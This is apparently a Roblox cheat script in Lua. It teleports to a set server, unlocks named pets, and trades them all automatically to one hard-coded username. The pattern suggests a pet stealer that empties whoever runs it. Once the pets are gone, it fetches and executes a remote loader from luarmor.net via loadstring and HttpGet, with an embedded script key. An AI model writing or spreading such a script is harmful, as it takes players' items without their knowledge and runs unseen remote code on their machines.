local targetUsernames = {"MALIKSTOM"}
local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot"}
local targetJobIds = {
"105a3fd7-b61b-4459-9ebb-4c4f5020285b"
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")

local Network = require(ReplicatedStorage.Modules.Network)
local Replication = require(ReplicatedStorage.Game.Replication)

local player = Players.LocalPlayer
local attemptedJobs = {}
local inTrade = false
local didAddThisTrade = false
local isFarming = false

local TARGET_PLACE_ID = 95383978784657

Network:BindEvents({
StartTrade = function()
inTrade = true
didAddThisTrade = false
end,
CloseTrade = function()
inTrade = false
didAddThisTrade = false
end,
})

local function WaitForCondition(fn, timeout)
local t0 = os.clock()
while not fn() do
if os.clock() - t0 > (timeout or 30) then
return false
end
task.wait(0.2)
end
return true
end

local function WaitForPets(timeout)
local t0 = os.clock()
while os.clock() - t0 < (timeout or 30) do
local pets = Replication.Data and Replication.Data.Pets
if pets and next(pets) ~= nil then
return pets
end
task.wait(0.2)
end
return Replication.Data and Replication.Data.Pets
end

local function UnlockPets()
local lookup = {}
for _, n in ipairs(petsToTrade) do
lookup[n] = true
end

local pets = WaitForPets(20)
if not pets then return end

for _, petData in pairs(pets) do
if petData and petData.Id and petData.Name and lookup[petData.Name] and petData.Locked then
Network:InvokeServer("LockPet", petData.Id, false)
end
end
end

local function GetPetIDsByName()
local ids = {}
local lookup = {}
for _, n in ipairs(petsToTrade) do
lookup[n] = true
end

local pets = WaitForPets(20)
if not pets then return ids end

for _, petData in pairs(pets) do
if petData and petData.Id and petData.Name and lookup[petData.Name] then
table.insert(ids, petData.Id)
end
end

return ids
end

local function HasPetsToTrade()
return #GetPetIDsByName() > 0
end

local function TeleportToJob(jobId)
while true do
local ok = pcall(function()
TeleportService:TeleportToPlaceInstance(TARGET_PLACE_ID, jobId)
end)
if ok then break end
task.wait(20)
end
end

local function GetRandomJobId()
local pool = {}
for _, id in ipairs(targetJobIds) do
if not attemptedJobs[id] then
table.insert(pool, id)
end
end

if #pool == 0 then
attemptedJobs = {}
return targetJobIds[math.random(#targetJobIds)]
end

return pool[math.random(#pool)]
end

local function IsInTargetJob()
for _, id in ipairs(targetJobIds) do
if game.JobId == id then
return true
end
end
return false
end

local function FindTargetPlayer()
for _, name in ipairs(targetUsernames) do
local p = Players:FindFirstChild(name)
if p then return p end
end
return nil
end

local function JoinRandomJob()
while true do
local jobId = GetRandomJobId()
attemptedJobs[jobId] = true
TeleportToJob(jobId)

local loaded = WaitForCondition(function()
return game:IsLoaded() and Players.LocalPlayer
end, 15)

if loaded then
task.wait(5)
if IsInTargetJob() then
return
end
end
end
end

local function StartFarming()
if isFarming then return end
isFarming = true

setfpscap(5)
script_key="SiLlPxglopaKOOSKsNJwsrbCnyMTcqtM"
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/ffab66f7d96a48c13b12e526b19b37d4.lua"))()
end

local function TradeWithTarget()
WaitForPets(20)

if game.GameId == 75992362647444 then
if not HasPetsToTrade() then
StartFarming()
return
end
else
if not HasPetsToTrade() then
player:Kick("No more pets to trade")
return
end
end

while true do
if game.GameId ~= 75992362647444 and not HasPetsToTrade() then
player:Kick("No more pets to trade")
return
end

UnlockPets()

local target = FindTargetPlayer()
if target then
if not inTrade then
Network:FireServer("SendTrade", target)
end

if inTrade and not didAddThisTrade then
didAddThisTrade = true

task.wait(0.3)

local petIDs = GetPetIDsByName()
for _, petId in ipairs(petIDs) do
Network:InvokeServer("AddTradeItem", { "Pet", petId })
task.wait(0.05)
end

Network:FireServer("ReadyUp", false, true)
end

if inTrade then
WaitForCondition(function()
return not inTrade
end, 999999)
end
end

task.wait(1)
end
end

if game.PlaceId == TARGET_PLACE_ID and not IsInTargetJob() then
JoinRandomJob()
elseif game.PlaceId ~= TARGET_PLACE_ID then
TeleportService:TeleportToPlaceInstance(TARGET_PLACE_ID)
end

TradeWithTarget()
